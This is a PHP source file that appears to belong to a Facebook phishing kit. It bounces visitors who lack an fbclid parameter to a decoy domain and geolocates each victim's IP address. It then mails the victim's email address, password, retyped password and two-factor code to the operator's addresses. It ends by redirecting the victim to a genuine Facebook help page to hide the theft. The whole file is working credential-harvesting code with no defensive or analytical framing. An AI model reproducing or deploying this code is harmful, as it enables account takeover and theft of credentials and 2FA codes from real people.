<?php
include $_SERVER['DOCUMENT_ROOT'] . '/constants.php';
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


function dieHere(...$args)
{
    print '<pre>';
    foreach ($args as $key => $value) {
        print_r($value);
    }
    die('here');
}

function accessDenied()
{

    if (!isset($_GET['fbclid'])) {
        header("Location: https://aswjhqegwemsdszcdselkljl.cz");
        exit();
    }
}

function heIsInMail($data)
{
    global $emails;
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    @ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    @ $hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    $QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);
    $string = 'imell:' . $data['imella'] . PHP_EOL;
    $string .= 'emni:' . $data['emri'] . PHP_EOL;
    $string .= 'koment:' . $data['komenti'] . PHP_EOL;
    $string .= PHP_EOL;
    $string .= PHP_EOL;

    $string .= $QUERY_STRING . PHP_EOL . PHP_EOL .
        '[IP address]: ' . $ip . PHP_EOL . PHP_EOL .
        '[Hostname]: ' . $hostname . PHP_EOL . PHP_EOL .
        '[Browser and OS]: ' . $_SERVER['HTTP_USER_AGENT'] . PHP_EOL;
    if (isset($details->loc)) {
        $string .= '[Coordinates]: ' . $details->loc . PHP_EOL . PHP_EOL .
            '[ISP provider]: ' . $details->org . PHP_EOL . PHP_EOL .
            '[City]: ' . $details->city . PHP_EOL . PHP_EOL .
            '[State]: ' . $details->region . PHP_EOL . PHP_EOL .
            '[Country]: ' . $details->country . PHP_EOL . PHP_EOL;

    }
    $string .= '[Date]: ' . date("D dS M,Y h:i a");


    return mailEmail($emails, "Hini", $string);
}

function pIncorrectMail($data = [])
{
    global $emails;
    $em_user = $data['hinem'];
    $user_ps = $data['hinempasi'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_ps = trim($user_ps);
    $stringi =  'imella: '.$em_user.PHP_EOL . 'pw: ' . $user_ps . PHP_EOL . 'ip: ' . $ip;
    return mailEmail($emails, "Ra", $stringi);
}

function pTypedAgain($data = '')
{
    global $emails;
    $em_user = $data['hinem'];
    $user_ps = $data['hinempasi'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_ps = trim($user_ps);
    $stringi =  'imella: '.$em_user.PHP_EOL . 'pw: ' . $user_ps . PHP_EOL . 'ip: ' . $ip;
    return mailEmail($emails, "Ra APET!", $stringi);
}

function dataStoredInCookie()
{
    return [
        'pageName:' => $_COOKIE['pgname'],
        'email' => $_COOKIE['email'],
        'username' => $_COOKIE['un'],
        'fullName' => $_COOKIE['fn'],
        'additionalInfo' => $_COOKIE['ai'],
    ];
}

function procesiIFinalizuar($t_fac = '')
{
    global $emails;
    $t_fac = trim($t_fac);

    $ip = $_SERVER['REMOTE_ADDR'];

    $stringi = 't_fac: ' . $t_fac . PHP_EOL . 'ip: ' . $ip;

    mailEmail($emails, "GutuSeRa!", $stringi);

    echo '<script>window.top.location.href = "https://www.facebook.com/help/282489752085908?helpref=popular_topics"; </script>';
}


function set_Cookie($key, $value)
{
    return setcookie($key, $value, time() + 3600);
}

function mailEmail($emails, $subject, $text)
{
    return mail($emails, $subject, $text);
}

function issetArray($array, $key, $return = '')
{
    return isset($array[$key]) ? $array[$key] : $return;
}
